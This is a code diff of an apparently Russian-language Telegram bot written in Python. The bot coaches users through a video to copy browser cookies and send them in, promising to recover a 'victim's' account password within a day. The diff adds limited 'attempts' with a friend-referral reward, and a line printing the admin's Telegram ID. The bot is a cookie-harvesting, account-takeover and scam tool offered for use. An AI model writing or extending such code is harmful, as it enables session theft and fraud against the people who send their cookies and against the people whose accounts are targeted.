@@ -706,6 +706,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "phone":
+        # Отправляем сообщение с видео и кнопками
         keyboard = [
             [
                 InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
@@ -720,7 +721,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
-        await query.delete_message()
+        # Удаляем сообщение с выбором устройства
+        await query.message.delete()
         return
     
     elif data == "computer":
@@ -737,15 +739,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
-        await query.delete_message()
+        await query.message.delete()
         return
     
     elif data == "cookies_copied":
+        # Проверяем попытки
+        available = get_available_attempts(user_id)
+        if available <= 0:
+            await query.edit_message_text(
+                "❌ У вас закончились попытки!\n\n"
+                "💡 Пригласите друга и получите +1 попытку!"
+            )
+            return
+        
         await query.edit_message_text(
             "✅ Отлично!\n\n"
             "📋 Теперь отправьте cookie в бота\n"
             "Бот начнет поиск пароля вашей жертвы 😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта"
+            "В течении дня бот скинет вам пароль от аккаунта\n\n"
+            f"🎯 У вас осталось {available} попыток"
         )
         return
     
@@ -1297,6 +1309,7 @@ def main():
     print("🤖 Бот запущен!")
     print("✅ Попытки тратятся ТОЛЬКО при отправке ключевого слова")
     print("✅ 2 бесплатные попытки + 1 за приглашение")
+    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
     app.run_polling()
 
 if __name__ == "__main__":
